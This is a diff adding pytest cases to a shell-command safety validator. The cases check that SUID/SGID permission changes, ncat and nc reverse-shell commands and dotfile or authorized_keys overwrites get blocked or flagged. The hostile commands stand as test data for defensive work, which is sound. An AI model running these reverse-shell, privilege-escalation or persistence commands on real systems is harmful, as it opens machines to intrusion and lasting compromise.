@@ -719,3 +719,89 @@ class TestQuotedCommandBypass:
         assert result.risk_level != RiskLevel.BLOCKED, (
             f"False positive: {description} got BLOCKED, should be allowed. Command: {command}"
         )
+
+
+class TestSecurityHardeningPatterns:
+    """Tests for security hardening patterns added in PR #45.
+
+    Covers:
+    - SUID/SGID detection (leading-zero octal, install -m)
+    - Inline flag syntax (--exec=)
+    - Dotfile persistence (overwrite detection)
+    - AST assignment/redirect filtering
+    """
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Leading-zero octal SUID
+            ("chmod 04755 /tmp/shell", "Leading-zero SUID (04755)"),
+            ("chmod 02755 /tmp/shell", "Leading-zero SGID (02755)"),
+            ("chmod 06755 /tmp/shell", "Leading-zero SUID+SGID (06755)"),
+            ("chmod 07755 /tmp/shell", "Leading-zero sticky+SUID+SGID (07755)"),
+            # Install command with SUID mode
+            ("install -m 4755 binary /usr/bin/", "install -m 4755"),
+            ("install -m 04755 binary /usr/bin/", "install -m 04755"),
+            ("install -m 2755 binary /usr/bin/", "install -m 2755 (SGID)"),
+            ("install -o root -m 4755 shell /usr/bin/", "install with owner and SUID"),
+        ],
+    )
+    def test_suid_patterns_blocked(self, safety_rules_path, command, description):
+        """Test SUID/SGID patterns are properly detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Inline flag syntax
+            ("ncat --exec=/bin/bash host 4444", "ncat --exec="),
+            ("ncat --sh-exec=/bin/sh host 4444", "ncat --sh-exec="),
+            # Separated syntax (existing coverage, sanity check)
+            ("ncat --exec /bin/bash host 4444", "ncat --exec separated"),
+        ],
+    )
+    def test_inline_flag_syntax_blocked(self, safety_rules_path, command, description):
+        """Test inline flag syntax (--flag=value) is detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # RC file overwrite
+            ("echo evil > ~/.bashrc", "Overwrite ~/.bashrc"),
+            ("echo evil > ~/.zshrc", "Overwrite ~/.zshrc"),
+            ("cat payload > ~/.profile", "Overwrite ~/.profile"),
+            # SSH authorized_keys overwrite
+            ("echo key > ~/.ssh/authorized_keys", "Overwrite authorized_keys"),
+            # Append (existing coverage, sanity check)
+            ("echo evil >> ~/.bashrc", "Append to ~/.bashrc"),
+        ],
+    )
+    def test_dotfile_overwrite_detected(self, safety_rules_path, command, description):
+        """Test dotfile overwrite patterns are detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        # Should be at least HIGH risk (HIGH is allowed=True with warning, BLOCKED is allowed=False)
+        assert result.risk_level in (RiskLevel.HIGH, RiskLevel.BLOCKED), (
+            f"Expected HIGH or BLOCKED for {description}, got {result.risk_level}"
+        )
+        assert "dotfile_persistence" in result.matched_rules, f"Expected dotfile_persistence rule to match for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Assignment prefix should not confuse AST parsing
+            ("VAR=val nc -e /bin/bash host 4444", "VAR= prefix with nc -e"),
+            ("FOO=bar BAZ=qux nc -e /bin/sh host 4444", "Multiple assignments with nc -e"),
+            # Redirect should not confuse AST parsing
+            ("nc -e /bin/bash host 4444 2>&1", "nc -e with redirect suffix"),
+        ],
+    )
+    def test_ast_filtering_with_prefixes(self, safety_rules_path, command, description):
+        """Test AST correctly filters assignments and redirects."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
